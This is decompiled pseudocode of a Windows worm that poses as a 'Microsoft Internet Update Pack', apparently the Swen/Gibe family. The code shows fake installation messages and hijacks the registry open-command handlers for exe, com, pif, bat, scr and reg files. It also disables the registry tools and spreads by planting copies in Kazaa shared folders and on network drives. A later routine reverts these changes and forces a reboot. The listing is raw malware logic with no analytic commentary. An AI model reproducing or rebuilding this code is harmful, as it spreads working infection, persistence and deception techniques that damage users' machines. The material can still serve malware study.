                    __eflags = _v2060;
                    if(_v2060 > 0) {
                        _push( &_v548);
                        _push(100);
                        __imp__GetTempPathA();
                        _v36 =  &_v548;
                         *((char*)(__ebp +  &_v548 - 544)) = 0;
                        L0040A210( &_v548,  &_v548);
                        __eflags =  *((char*)(__ebp +  &_v548 - 545)) - 92;
                        if( *((char*)(__ebp +  &_v548 - 545)) != 92) {
                            _push("\\");
                            _push( &_v548);
                            L0040A100( &_v548);
                            _pop(__ecx);
                            _pop(__ecx);
                        }
                        _push("nntptmp.fl");
                        _push( &_v548);
                        L0040A100( &_v548);
                        _pop(__ecx);
                        _pop(__ecx);
                        _push(0);
                        _push(128);
                        _push(2);
                        _push(0);
                        _push(3);
                        _push(1073741824);
                        _push( &_v548);
                        __imp__CreateFileA();
                        _v1148 =  &_v548;
                        __eflags =  &_v548 - -1;
                        if( &_v548 != -1) {
                            _push(0);
                            _push( &_v36);
                            _push(_v2060);
                            _push(_v1160);
                            _push( &_v548);
                            __imp__WriteFile();
                            _push( &_v548);
                            __imp__CloseHandle();
                            _push(0);
                            _push( &_v1296);
                            _push( &_v548);
                            LZOpenFileA();
                            _v1144 =  &_v548;
                            __eflags =  &_v548;
                            if( &_v548 >= 0) {
                                _push(4271872);
                                _push("%s\\swen1.dat");
                                _push( &_v880);
                                 *_t539();
                                __esp = __esp + 12;
                                _push(4096);
                                _push( &_v1684);
                                _push( &_v880);
                                LZOpenFileA();
                                _v1152 =  &_v880;
                                _push( &_v880);
                                _push( &_v548);
                                LZCopy();
                                _push( &_v548);
                                LZClose();
                                _push(_v1152);
                                LZClose();
                            }
                            _push( &_v548);
                            __imp__DeleteFileA();
                        }
                    }
                }
                L004066EB(-2147483646, 4302344, "Installed", 1, "... by Begbie");
                _push(0);
                _push(0);
                _push("autorun");
                _push( &_v1140);
                _push(0);
                _push(0);
                __imp__ShellExecuteA();
                _push(1000);
                __imp__Sleep();
                _push( &_v680);
                _push("%s "%%1" %%*");
                _push( &_v880);
                 *_t539();
                __esp = __esp + 12;
                _v552 = 0;
                while(1) {
                    _t365 = _v552;
                    __eflags = _t365 - 4;
                    if(_t365 >= 4) {
                        break;
                    }
                    _t378 = _t365;
                    __eflags = _t378;
                    if(_t378 == 0) {
                        _push("exefile");
L124:
                        _push( &_v548);
                        L0040A0F0(__edx);
                        _pop(__ecx);
                        _pop(__ecx);
L125:
                        _push("\\shell\\open\\command");
                        _push( &_v548);
                        L0040A100( &_v548);
                        L004066EB(-2147483648,  &_v548, 0, 1,  &_v880);
                        __esp = __esp + 8;
                        _v552 = _v552 + 1;
                        continue;
                    }
                    _t383 = _t378 - 1;
                    __eflags = _t383;
                    if(_t383 == 0) {
                        _push("comfile");
                        goto L124;
                    }
                    _t384 = _t383 - 1;
                    __eflags = _t384;
                    if(_t384 == 0) {
                        _push("piffile");
                        goto L124;
                    }
                    __eflags = _t384 != 1;
                    if(_t384 != 1) {
                        goto L125;
                    }
                    _push("batfile");
                    goto L124;
                }
                _push( &_v680);
                _push("%s "%%1" /S");
                _push( &_v548);
                 *_t539();
                _push( &_v548);
                _push(1);
                _push(0);
                _push("scrfile\\shell\\open\\command");
                _push(-2147483648);
                L004066EB();
                _push( &_v680);
                _push("%s "%%1"");
                _push( &_v548);
                 *_t539();
                L004066EB(-2147483648, "scrfile\\shell\\config\\command", 0, 1,  &_v548);
                __esp = __esp + 44;
                _push( &_v680);
                _push("%s showerror");
                _push( &_v548);
                 *_t539();
                _push( &_v548);
                _push(1);
                _pop(__esi);
                _push(_t539);
                _push(0);
                _push("regfile\\shell\\open\\command");
                _push(-2147483648);
                L004066EB();
                _v36 = _t539;
                _t375 =  &_v36;
                L004066EB(-2147483647, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 4,  &_v36);
                __esp = __esp + 32;
                __eflags = _v32;
                if(_v32 != 0) {
                    _push(4);
                    _push(_v1156);
                    L0040864E();
                    _pop(__ecx);
                    _pop(__ecx);
                    _push(0);
                    _push(_v1156);
                    __imp__EndDialog();
                    _push(64);
                    _push("Microsoft Internet Update Pack");
                    _push("This update has been successfully installed.");
                    _push(0);
                    __imp__MessageBoxA();
                }
                __imp__GetLogicalDrives();
                _t528 = _t375;
                _v248 = _t528;
                _t538 = 0;
                __eflags = 0;
                while(1) {
                    _v552 = _t538;
                    __eflags = _t538 - 26;
                    if(__eflags >= 0) {
                        break;
                    }
                    _push(1);
                    _pop(__eax);
                    _t375 = _t375 << _t538;
                    __eflags = _t528 & _t375;
                    if((_t528 & _t375) != 0) {
                        _v2052 = _t538 + 65;
                        _v2051 = 58;
                        _v2050 = 92;
                        _v2049 = 0;
                        _t375 =  &_v2052;
                        _push( &_v2052);
                        __imp__GetDriveTypeA();
                        _v2584 =  &_v2052;
                        __eflags =  &_v2052 - 4;
                        if( &_v2052 == 4) {
                            _push( &_v1140);
                            _t375 =  &_v2052;
                            _push( &_v2052);
                            L00408003();
                            _pop(__ecx);
                            _pop(__ecx);
                        }
                    }
                    _t538 = _t538 + 1;
                }
L134:
                _v8 = _v8 | -1;
                 *fs:0x0] = _v20;
                _pop(__edi);
                _pop(__esi);
                _pop(__ebx);
                return;
            } else {
                _push(_v2064);
                __imp__RegCloseKey();
                _push("Software\\Kazaa");
                _push( &_v548);
                L0040A0F0(__edx);
                _push("\\LocalContent");
                _push( &_v548);
                L0040A100( &_v548);
                _v36 = 0;
                L004066EB(-2147483647,  &_v548, "DisableSharing", 4,  &_v36);
                __esp = __esp + 16;
                _v552 = 0;
                while(1) {
                    __eflags = _v552 - 2;
                    if(_v552 >= 2) {
                        break;
                    }
                    _push("Software\\Kazaa");
                    _push( &_v548);
                    L0040A0F0(__edx);
                    _pop(__ecx);
                    _pop(__ecx);
                    __eflags = _v552;
                    if(_v552 != 0) {
                        _push("\\Transfer");
                        _push( &_v548);
                        L0040A100( &_v548);
                        _push("DlDir0");
                    } else {
                        _push("\\LocalContent");
                        _push( &_v548);
                        L0040A100( &_v548);
                        _push("DownloadDir");
                    }
                    _push( &_v880);
                    L0040A0F0(__edx);
                    __esp = __esp + 16;
                    _push( &_v2572);
                    _push( &_v880);
                    _t478 =  &_v548;
                    _push( &_v548);
                    _push(-2147483647);
                    L0040679E();
                    __esp = __esp + 16;
                    __eflags = _v2572;
                    if(_v2572 != 0) {
                        __eflags = _v1692;
                        if(_v1692 == 0) {
                            _v2588 = 0;
                        } else {
                            L00406850(5);
                            _t478 =  &(((char*)( &_v548))[0]);
                            _v2588 = _t478;
                        }
                        _push(3);
                        L00406850();
                        _push(_t478);
                        _push(_v2588);
                        _push( &_v240);
                        asm("sbb eax, eax");
                        _t482 =  ~_v1692 &  &_v1396;
                        __eflags = _t482;
                        _push(_t482);
                        _push( &_v2572);
                        L004087D7(__edx);
                        __esp = __esp + 24;
                    }
                    _v552 = _v552 + 1;
                }
                _push( &_v1792);
                _push(100);
                __imp__GetTempPathA();
                _v36 =  &_v1792;
                __eflags =  *((char*)(__ebp +  &_v1792 - 1789)) - 92;
                if( *((char*)(__ebp +  &_v1792 - 1789)) != 92) {
                    _push("\\");
                    _push( &_v1792);
                    L0040A100( &_v1792);
                    _pop(__ecx);
                    _pop(__ecx);
                }
                _push(5);
                L00406850();
                _push( &_v1792 + 2);
                _push( &_v548);
                L004068F4();
                L0040A100( &_v1792,  &_v1792,  &_v548);
                __esp = __esp + 12;
                _push(0);
                _push( &_v1792);
                __imp__CreateDirectoryA();
                __eflags =  &_v1792;
                if( &_v1792 != 0) {
                    _push("Software\\Kazaa");
                    _push( &_v548);
                    L0040A0F0(__edx);
                    _push("\\LocalContent");
                    _push( &_v548);
                    L0040A100( &_v548);
                    _push("012345:");
                    _push( &_v880);
                    L0040A0F0(__edx);
                    _push( &_v1792);
                    _push( &_v880);
                    L0040A100( &_v880);
                    _push( &_v880);
                    _push(1);
                    _push("Dir99");
                    _t466 =  &_v548;
                    _push( &_v548);
                    _push(-2147483647);
                    L004066EB();
                    __esp = __esp + 52;
                    __eflags = _v1692;
                    if(_v1692 == 0) {
                        _v2592 = 0;
                    } else {
                        L00406850(5);
                        _t466 =  &(((char*)( &_v548))[0]);
                        _v2592 = _t466;
                    }
                    _push(3);
                    L00406850();
                    _push(_t466);
                    _push(_v2592);
                    _push( &_v240);
                    asm("sbb eax, eax");
                    _t470 =  ~_v1692 &  &_v1396;
                    __eflags = _t470;
                    _push(_t470);
                    _push( &_v1792);
                    L004087D7(__edx);
                    __esp = __esp + 24;
                }
                L004066EB(-2147483646, 4302344, "Kazaa Infect", 1, "yes");
                goto L68;
            }
        }
        _push("... by Begbie");
        _push( &_v548);
        _t375 = L0040D680( &_v1396);
        _pop(__ecx);
        _pop(__ecx);
        if(_t375 != 0) {
            goto L20;
        } else {
            if(_v32 != 0) {
                _push(48);
                _push("Microsoft Internet Update Pack");
                _push("This update does not need to be installed on this system.");
                _push(0);
                __imp__MessageBoxA();
            }
            goto L134;
        }
    } else {
        _v548 = 0;
        _v556 = 0;
        _t536 = 0;
        _v552 = 0;
        goto L2;
        do {
        } while();
        goto L4;
L2:
        _t515 = L00406850(26);
        _v36 = _t515;
        _v556 = _t515 + _v556;
         *((char*)(__ebp + _t536 - 544)) =  &(_t515[0x10]);
        _t536 = _t536 + 1;
        _v552 = _t536;
        if(_v556 < 54) {
            goto L2;
        } else {
             *((char*)(__ebp + _t536 - 544)) = 144 - _v556;
             *((char*)(__ebp + _t536 - 543)) = 0;
            _push("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer");
            _push(_t538);
            _t519 = L0040A0F0(__edx);
            _push("\\");
            _push(_t538);
            L0040A100(_t519);
            L0040A100( &_v548, _t538,  &_v548);
            __esp = __esp + 16;
        }
        goto L4;
    }
}

L00409A73(
    _unknown_ __edx                        // r3
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    _unknown_ _v32;                        // _cfa_ffffffe0
    char _v132;                            // _cfa_ffffff7c
    signed int _v136;                      // _cfa_ffffff78
    intOrPtr _v140;                        // _cfa_ffffff74
    char _v144;                            // _cfa_ffffff70
    char _v244;                            // _cfa_ffffff0c
    char* _v248;                           // _cfa_ffffff08
    signed int _v252;                      // _cfa_ffffff04
    _unknown_ _v256;                       // _cfa_ffffff00
    char* _v260;                           // _cfa_fffffefc
    intOrPtr _v264;                        // _cfa_fffffef8
    intOrPtr _v268;                        // _cfa_fffffef4
    intOrPtr _v272;                        // _cfa_fffffef0
    char* _v276;                           // _cfa_fffffeec
    intOrPtr _v280;                        // _cfa_fffffee8
    intOrPtr _v284;                        // _cfa_fffffee4
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    char* _t90;                            // _t90
    _unknown_ _t93;                        // _t93
    intOrPtr _t104;                        // _t104
    intOrPtr _t107;                        // _t107
    intOrPtr _t121;                        // _t121
    _unknown_ _t128;                       // _t128
    _unknown_ _t129;                       // _t129
    _unknown_ _t150;                       // _t150
    intOrPtr _t161;                        // _t161
    _unknown_ _t168;                       // _t168
    _unknown_ _t169;                       // _t169
    _unknown_ _t170;                       // _t170
    _unknown_ _t172;                       // _t172
    _unknown_ _t174;                       // _t174
    _unknown_ _t176;                       // _t176
    char* _t177;                           // _t177
    intOrPtr _t178;                        // _t178
    char* _t179;                           // _t179
    intOrPtr _t180;                        // _t180
    _unknown_ _t181;                       // _t181
    intOrPtr* _t183;                       // _t183

    __edx = __edx;
    _push(-1);
    _push(4253168);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 264;
    _push(_t172);
    _push(_t181);
    _push(_t176);
    _v28 = __esp;
    _v144 = 0;
    _v8 = 0;
    _t90 = "Explorer XBaseBar";
    _push(_t90);
    _push(_t90);
    __imp__FindWindowA();
    _v140 = _t90;
    if(_t90 != 0) {
        _push(0);
        _push(0);
        _push(2);
        _push(_t90);
        __imp__PostMessageA();
    }
    _v136 = 0;
    while(_v136 < 5) {
        _t161 = _v136;
        if(_t161 == 0) {
            _push("germs0.dbv");
L14:
            _push( &_v132);
            L0040A0F0(__edx);
            _pop(__ecx);
            _pop(__ecx);
L15:
            _push( &_v132);
            _push(4271872);
            _push("%s\\%s");
            _push( &_v244);
            __imp__wsprintfA();
            __esp = __esp + 16;
            _push( &_v244);
            __imp__GetFileAttributesA();
            if( &_v244 != -1) {
                _push( &_v244);
                __imp__DeleteFileA();
            }
            _v136 = _v136 + 1;
            continue;
        }
        _t168 = _t161 - 1;
        if(_t168 == 0) {
            _push("germs1.dbv");
            goto L14;
        }
        _t169 = _t168 - 1;
        if(_t169 == 0) {
            _push("swen0.dat");
            goto L14;
        }
        _t170 = _t169 - 1;
        if(_t170 == 0) {
            _push("swen1.dat");
            goto L14;
        }
        if(_t170 != 1) {
            goto L15;
        } else {
            _push("nntpgroups.dat");
            goto L14;
        }
    }
    _push(4302344);
    L00406DCD();
    _push( &_v244);
    _push("Install Item");
    _push(4302344);
    _t177 = -2147483646;
    _push(-2147483646);
    _t93 = L0040679E();
    __esp = __esp + 20;
    if(_t93 != 0) {
        _push( &_v144);
        _push(2);
        _push(0);
        _push("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        _push(-2147483646);
        __imp__RegOpenKeyExA();
        if(_v144 != 0) {
            _push( &_v244);
            _push(_v144);
            __imp__RegDeleteValueA();
            _push(_v144);
            __imp__RegCloseKey();
        }
    }
    if(L0040679E(_t177, 4302344, "Kazaa Infect",  &_v244) != 0) {
        _push("yes");
        _push( &_v244);
        _t150 = L0040D680(_t174);
        _pop(__ecx);
        _pop(__ecx);
        if(_t150 == 0) {
            _push("Software\\Kazaa");
            _push( &_v132);
            L0040A0F0(__edx);
            _push("\\LocalContent");
            _push( &_v132);
            L0040A100( &_v132);
            _v32 = 1;
            L004066EB(-2147483647,  &_v132, "DisableSharing", 4,  &_v32);
            __esp = __esp + 16;
        }
    }
    if(L0040679E(_t177, 4302344, "Mirc Install Folder",  &_v244) != 0) {
        _push( &_v244);
        _push("%s\\script.ini");
        _push( &_v132);
        __imp__wsprintfA();
        __esp = __esp + 12;
        _push( &_v132);
        __imp__DeleteFileA();
        _push("\\script.bcp");
        _push( &_v244);
        L0040A100( &_v244);
        _pop(__ecx);
        _pop(__ecx);
        _push( &_v244);
        __imp__GetFileAttributesA();
        if( &_v244 != -1) {
            _push( &_v132);
            _push( &_v244);
            __imp__MoveFileA();
        }
    }
    if(L0040679E(_t177, 4302344, "Unfile",  &_v132) == 0) {
        _t183 = -2147483648;
        goto L36;
    } else {
        _push( &_v132);
        _push(4271872);
        _push("%s\\%s");
        _push( &_v244);
        __imp__wsprintfA();
        __esp = __esp + 16;
        _push(0);
        _push(128);
        _push(3);
        _push(0);
        _push(3);
        _t183 = -2147483648;
        _push(-2147483648);
        _push( &_v244);
        __imp__CreateFileA();
        _v248 =  &_v244;
        if( &_v244 == -1) {
L36:
            _push(4302344);
            _push(_t177);
            __imp__RegDeleteKeyA();
            _v136 = 0;
            while(_v136 < 4) {
                _t121 = _v136;
                if(_t121 == 0) {
                    _push("exefile");
L46:
                    _push( &_v244);
                    L0040A0F0(__edx);
                    _pop(__ecx);
                    _pop(__ecx);
L47:
                    _push("\\shell\\open\\command");
                    _push( &_v244);
                    L0040A100( &_v244);
                    L004066EB(_t183,  &_v244, 0, 1, ""%1" %*");
                    __esp = __esp + 8;
                    _v136 = _v136 + 1;
                    continue;
                }
                _t128 = _t121 - 1;
                if(_t128 == 0) {
                    _push("comfile");
                    goto L46;
                }
                _t129 = _t128 - 1;
                if(_t129 == 0) {
                    _push("piffile");
                    goto L46;
                }
                if(_t129 != 1) {
                    goto L47;
                }
                _push("batfile");
                goto L46;
            }
            _push(""%1" /S");
            _push(1);
            _push(0);
            _push("scrfile\\shell\\open\\command");
            _push(_t183);
            L004066EB();
            _push(""%1"");
            _push(1);
            _push(0);
            _push("scrfile\\shell\\config\\command");
            _push(_t183);
            L004066EB();
            _push("regedit.exe "%1"");
            _push(1);
            _push(0);
            _push("regfile\\shell\\open\\command");
            _push(_t183);
            L004066EB();
            _v32 = 0;
            _t104 = L004066EB(-2147483647, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 4,  &_v32);
            __esp = __esp + 60;
            if( *4302444 != 0) {
                _push(4271872);
                _push("%s\\Wininit.ini");
                _push( &_v132);
                _t183 = __imp__wsprintfA;
                 *_t183();
                __esp = __esp + 12;
                _push(0);
                _push(128);
                _push(2);
                _push(0);
                _push(0);
                _push(1073741824);
                _push( &_v132);
                __imp__CreateFileA();
                _t177 =  &_v132;
                _v276 =  &_v132;
                if( &_v132 != -1) {
                    _push(100);
                    _push( &_v244);
                    _push(0);
                    __imp__GetModuleFileNameA();
                    _push(100);
                    _push( &_v132);
                    _push( &_v244);
                    __imp__GetShortPathNameA();
                    if( &_v244 > 0) {
                        _push( &_v132);
                        _push( &_v244);
                        L0040A0F0(__edx);
                        _pop(__ecx);
                        _pop(__ecx);
                    }
                    _push( &_v244);
                    _push("[rename]\nNUL=%s\n");
                    _push( &_v132);
                     *_t183();
                    __esp = __esp + 12;
                    _push(0);
                    _push( &_v32);
                    L0040A210( &_v132,  &_v132);
                    _push( &_v132);
                    _push( &_v132);
                    _push(_t177);
                    __imp__WriteFile();
                    _push(_t177);
                    __imp__CloseHandle();
                }
            } else {
                _push("kernel32.dll");
                __imp__GetModuleHandleA();
                _v268 = _t104;
                if(_t104 != 0) {
                    _push("MoveFileExA");
                    _push(_t104);
                    __imp__GetProcAddress();
                    _v272 = _t104;
                    if(_t104 != 0) {
                        _push(100);
                        _push( &_v244);
                        _push(0);
                        __imp__GetModuleFileNameA();
                        _push(4);
                        _push(0);
                        _push( &_v244);
                        _v272();
                    }
                }
            }
            _t107 =  *4302556;
            if(_t107 != 0) {
                _push(0);
                _push(0);
                _push(2);
                _push(_t107);
                __imp__PostMessageA();
            }
            _v8 = _v8 | -1;
            _push(0);
            _push(6);
            __imp__ExitWindowsEx();
            _push(0);
            __imp__ExitProcess();
             *fs:0x0] = _v20;
            _pop(__edi);
            _pop(__esi);
            _pop(__ebx);
            return;
        }
        _v252 = 0;
        _push(0);
        _push( &_v244);
        __imp__GetFileSize();
        _v32 =  &_v244;
        _t178 = L0040AA95( &_v244 + 3);
        _v280 = _t178;
        _v252 = _t178;
        if(_t178 == 0) {
L34:
            _push(_v248);
            __imp__CloseHandle();
            _push( &_v244);
            __imp__DeleteFileA();
            _t177 = -2147483646;
            goto L36;
        }
        _push(0);
        _push( &_v256);
        _push(_v32);
        _push(_t178);
        _push(_v248);
        __imp__ReadFile();
        _t138 = _v256;
         *((char*)(_v256 + _t178)) = 0;
        _v264 = _t178;
        _push("\n");
        _push(_t178);
        while(1) {
            _t138 = L0040A070(_t138, __edx);
            _pop(__ecx);
            _pop(__ecx);
            _t179 = _t138;
            _v260 = _t179;
            if(_t179 == 0) {
                break;
            }
             *_t179 = 0;
            _push(_v264);
            __imp__DeleteFileA();
            _t180 = _t179 + 2;
            _v264 = _t180;
            _push("\n");
            _push(_t180);
        }
        _t139 = _v252;
        _v284 = _v252;
        L0040AB34(_t139);
        goto L34;
    }
}

L0040A016()
{
    goto ( *4252260);
}

L0040A01C()
{
    goto ( *4252256);
}

L0040A022()
{
    goto ( *4252252);
}

L0040A028()
{
    goto ( *4252248);
}

L0040A02E()
{
    goto ( *4252224);
}

L0040A034()
{
    goto ( *4252244);
}

L0040A03A()
{
    goto ( *4252240);
}

L0040A040()
{
    goto ( *4252236);
}

VerQueryValueA()
{// addr = 0x0040A052
    goto __imp__VerQueryValueA;
}

GetFileVersionInfoA()
{// addr = 0x0040A058
    goto __imp__GetFileVersionInfoA;
}

LZClose()
{// addr = 0x0040A05E
    goto __imp__LZClose;
}

LZCopy()
{// addr = 0x0040A064
    goto __imp__LZCopy;
}

LZOpenFileA()
{// addr = 0x0040A06A
    goto __imp__LZOpenFileA;
}

signed int L0040A070(
    _unknown_ __eax,                       // r0
    _unknown_ __edx,                       // r3
    signed int _a4,                        // _cfa_4
    intOrPtr* _a8                          // _cfa_8
)
{
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t25;                       // _t25
    signed int _t27;                       // _t27
    signed int _t29;                       // _t29
    unsigned int _t30;                     // _t30
    unsigned int _t34;                     // _t34
    signed int _t37;                       // _t37
    _unknown_ _t40;                        // _t40
    intOrPtr _t41;                         // _t41
    intOrPtr _t45;                         // _t45
    _unknown_ _t48;                        // _t48
    signed int _t49;                       // _t49
    intOrPtr* _t52;                        // _t52
    signed int _t53;                       // _t53
    signed int _t58;                       // _t58
    intOrPtr _t59;                         // _t59
    intOrPtr _t62;                         // _t62
    signed int _t63;                       // _t63
    _unknown_ _t64;                        // _t64
    signed int _t65;                       // _t65
    _unknown_ _t68;                        // _t68
    _unknown_ _t70;                        // _t70
    intOrPtr* _t72;                        // _t72

    _t52 = _a8;
    _push(_t64);
    _push(_t48);
    _push(_t68);
    _t65 = _a4;
    if( *_t52 == 0) {
        _pop(__esi);
        _pop(__ebx);
        _pop(__edi);
        return _t65;
    } else {
        _t62 = _t52[0];
        if(_t62 == 0) {
            _pop(__esi);
            _pop(__ebx);
            _pop(__edi);
            _push(_t48);
            _t49 = 0;
            _t25 = 0 << 8;
            _t63 = _a4;
            if((_t63 & 3) == 0) {
L23:
                _push(_t65);
                _push(_t68);
                _t49 = (_t49 | _t25) << 16 | _t49 | _t25;
                while(1) {
L24:
                    _t53 =  *_t63;
                    _t27 = _t53;
                    _t70 = 2130640639 + _t27;
                    _t29 = _t27 ^ 0xffffffff81010100;
                    _t63 = _t63 + 4;
                    if(((_t53 ^ _t49 ^ -1 ^ 2130640639 + (_t53 ^ _t49)) & -2130640640) == 0) {
                        break;
                    }
                    _t30 =  *(_t63 - 4);
                    if(_t30 == _t49) {
                        _pop(__esi);
                        _pop(__edi);
                        _pop(__ebx);
                        return _t63 - 4;
                    } else {
                        if(_t30 == 0) {
L28:
                            _pop(__esi);
                            _pop(__edi);
                            goto L29;
                        } else {
                            if(_t30 == _t49) {
                                _pop(__esi);
                                _pop(__edi);
                                _pop(__ebx);
                                return _t63 - 3;
                            } else {
                                if(_t30 == 0) {
                                    goto L28;
                                } else {
                                    _t34 = _t30 >> 16;
                                    if(_t34 == _t49) {
                                        _pop(__esi);
                                        _pop(__edi);
                                        _pop(__ebx);
                                        return _t63 - 2;
                                    } else {
                                        if(_t34 == 0) {
                                            goto L28;
                                        } else {
                                            if(_t34 == _t49) {
                                                _pop(__esi);
                                                _pop(__edi);
                                                _pop(__ebx);
                                                return _t63 - 1;
                                            } else {
                                                if(_t34 == 0) {
                                                    goto L28;
                                                } else {
                                                    continue;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    goto L43;
                }
                _t37 = _t29 & -2130640640;
                if(_t37 == 0 || (_t37 & 16843008) == 0 && _t70 != 0) {
                    goto L24;
                } else {
                    goto L28;
                }
            } else {
                while(1) {
                    _t58 =  *_t63;
                    _t63 = _t63 + 1;
                    if(_t58 == _t49) {
                        break;
                    }
                    if(_t58 == 0) {
L29:
                        _pop(__ebx);
                        return 0;
                    } else {
                        if((_t63 & 3) != 0) {
                            continue;
                        } else {
                            goto L23;
                        }
                    }
                    goto L43;
                }
                _pop(__ebx);
                return _t63 - 1;
            }
        } else {
            while(1) {
L2:
                _t59 = _a8;
                _t40 =  *_t65;
                _t72 = _t65 + 1;
                if(_t40 == _t62) {
                    goto L8;
                }
L3:
                if(_t40 == 0) {
L7:
                    _pop(__esi);
                    _pop(__ebx);
                    _pop(__edi);
                    return 0;
                } else {
L4:
                    _t41 =  *_t72;
                    _t72 = _t72 + 1;
L5:
                    if(_t41 == _t62) {
                        goto L8;
                    } else {
                        if(_t41 != 0) {
                            goto L4;
                        } else {
                            goto L7;
                        }
                    }
                }
                goto L43;
L8:
                _t41 =  *_t72;
                _t72 = _t72 + 1;
                if(_t41 != _t62) {
                    goto L5;
                } else {
                    _t65 = _t72 - 1;
                    while( *((intOrPtr*)(_t59 + 2)) != 0) {
                        _t45 =  *_t72;
                        _t72 = _t72 + 2;
                        if(_t45 != _t45) {
                            goto L2;
                        } else {
                            if( *((intOrPtr*)(_t59 + 3)) == 0) {
                                break;
                            } else {
                                _t59 = _t59 + 2;
                                if( *(_t72 - 1) ==  *(_t72 - 1)) {
                                    continue;
                                } else {
                                    while(1) {
L2:
                                        _t59 = _a8;
                                        _t40 =  *_t65;
                                        _t72 = _t65 + 1;
                                        if(_t40 == _t62) {
                                            goto L8;
                                        }
                                        goto L3;
                                    }
                                }
                            }
                        }
                        goto L43;
                    }
                    _pop(__esi);
                    _pop(__ebx);
                    _pop(__edi);
                    return _t65 - 1;
                }
                goto L43;
            }
        }
    }
L43:
}

signed int* L0040A0F0(
    _unknown_ __edx,                       // r3
    signed int* _a4,                       // _cfa_4
    signed int _a8                         // _cfa_8
)
{
    signed int* __edi;                     // r4
    signed int _t20;                       // _t20
    signed int _t28;                       // _t28

    __edi = _a4;
    __ecx = _a8;
    if((__ecx & 3) == 0) {
        goto L6;
    } else {
        while(1) {
            _t28 =  *__ecx;
            __ecx = __ecx + 1;
            if(_t28 == 0) {
                break;
            }
             *__edi = _t28;
            __edi =  &(__edi[0]);
            if((__ecx & 3) != 0) {
                continue;
            } else {
                while(1) {
L6:
                    _t20 =  *__ecx ^ -1 ^ 2130640639 +  *__ecx;
                    _t28 =  *__ecx;
                    __ecx = __ecx + 4;
                    if((_t20 & -2130640640) == 0) {
                        goto L5;
                    }
                    if(_t28 == 0) {
                        goto L15;
                    } else {
                        if(_t28 == 0) {
                             *__edi = _t28;
                            return _a4;
                        } else {
                            if((_t28 & 16711680) == 0) {
                                 *__edi = _t28;
                                __edi[0] = 0;
                                return _a4;
                            } else {
                                if((_t28 & -16777216) == 0) {
                                     *__edi = _t28;
                                    return _a4;
                                } else {
                                    goto L5;
                                }
                            }
                        }
                    }
                    goto L16;
L5:
                     *__edi = _t28;
                    __edi =  &(__edi[1]);
                }
            }
            goto L16;
        }
L15:
         *__edi = _t28;
        return _a4;
    }
L16:
}

signed int L0040A100(
    _unknown_ __eax,                       // r0
    signed int _a4,                        // _cfa_4
    signed int _a8                         // _cfa_8
)
{
    signed int __edi;                      // r4
    signed int _t36;                       // _t36
    signed int _t37;                       // _t37
    signed int _t40;                       // _t40
    _unknown_ _t45;                        // _t45
    signed int _t46;                       // _t46
    signed int _t47;                       // _t47
    signed int _t52;                       // _t52

    _t46 = _a4;
    if((_t46 & 3) == 0) {
L3:
        _t36 =  *_t46 ^ -1 ^ 2130640639 +  *_t46;
        _t46 = _t46 + 4;
    } else {
        while(1) {
            _t45 =  *_t46;
            _t46 = _t46 + 1;
            if(_t45 == 0) {
                break;
            }
            if((_t46 & 3) != 0) {
                continue;
            } else {
                while(1) {
L3:
                    _t36 =  *_t46 ^ -1 ^ 2130640639 +  *_t46;
                    _t46 = _t46 + 4;
                    if((_t36 & -2130640640) == 0) {
                        continue;
                    }
L4:
                    _t37 =  *(_t46 - 4);
                    if(_t37 == 0) {
                        __edi = _t46 - 4;
                    } else {
                        if(_t37 == 0) {
                            __edi = _t46 - 3;
                        } else {
                            if((_t37 & 16711680) == 0) {
                                __edi = _t46 - 2;
                            } else {
                                if((_t37 & -16777216) == 0) {
                                    goto L9;
                                } else {
                                    do {
                                        goto L3;
                                    } while((_t36 & -2130640640) == 0);
                                    goto L4;
                                }
                            }
                        }
                    }
                    goto L13;
                }
            }
            goto L13;
        }
L9:
        __edi = _t46 - 1;
    }
L13:
    _t47 = _a8;
    if((_t47 & 3) == 0) {
        goto L18;
    } else {
        while(1) {
            _t52 =  *_t47;
            _t47 = _t47 + 1;
            if(_t52 == 0) {
                break;
            }
             *__edi = _t52;
            __edi = __edi + 1;
            if((_t47 & 3) != 0) {
                continue;
            } else {
                while(1) {
L18:
                    _t40 =  *_t47 ^ -1 ^ 2130640639 +  *_t47;
                    _t52 =  *_t47;
                    _t47 = _t47 + 4;
                    if((_t40 & -2130640640) == 0) {
                        goto L17;
                    }
                    if(_t52 == 0) {
                        goto L27;
                    } else {
                        if(_t52 == 0) {
                             *__edi = _t52;
                            return _a4;
                        } else {
                            if((_t52 & 16711680) == 0) {
                                 *__edi = _t52;
                                 *((char*)(__edi + 2)) = 0;
                                return _a4;
                            } else {
                                if((_t52 & -16777216) == 0) {
                                     *__edi = _t52;
                                    return _a4;
                                } else {
                                    goto L17;
                                }
                            }
                        }
                    }
                    goto L28;
L17:
                     *__edi = _t52;
                    __edi = __edi + 4;
                }
            }
            goto L28;
        }
L27:
         *__edi = _t52;
        return _a4;
    }
L28:
}

L0040A1E0(
    _unknown_ __ecx,                       // r2
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    _unknown_ __edi;                       // r4
    intOrPtr* _t5;                         // _t5
    intOrPtr* _t12;                        // _t12

    asm("repne scasb");
    asm("std");
    asm("repne scasb");
    _t12 = _a4 - 1 + 1;
    if( *_t12 == _a8) {
        _t5 = _t12;
    } else {
        _t5 = 0;
    }
    asm("cld");
    return _t5;
}

signed int L0040A210(
    _unknown_ __eax,                       // r0
    signed int _a4                         // _cfa_4
)
{
    signed int _t24;                       // _t24
    signed int _t25;                       // _t25
    _unknown_ _t34;                        // _t34
    signed int _t36;                       // _t36

    _t36 = _a4;
    if((_t36 & 3) == 0) {
L4:
        _t24 =  *_t36 ^ -1 ^ 2130640639 +  *_t36;
        _t36 = _t36 + 4;
    } else {
        while(1) {
            _t34 =  *_t36;
            _t36 = _t36 + 1;
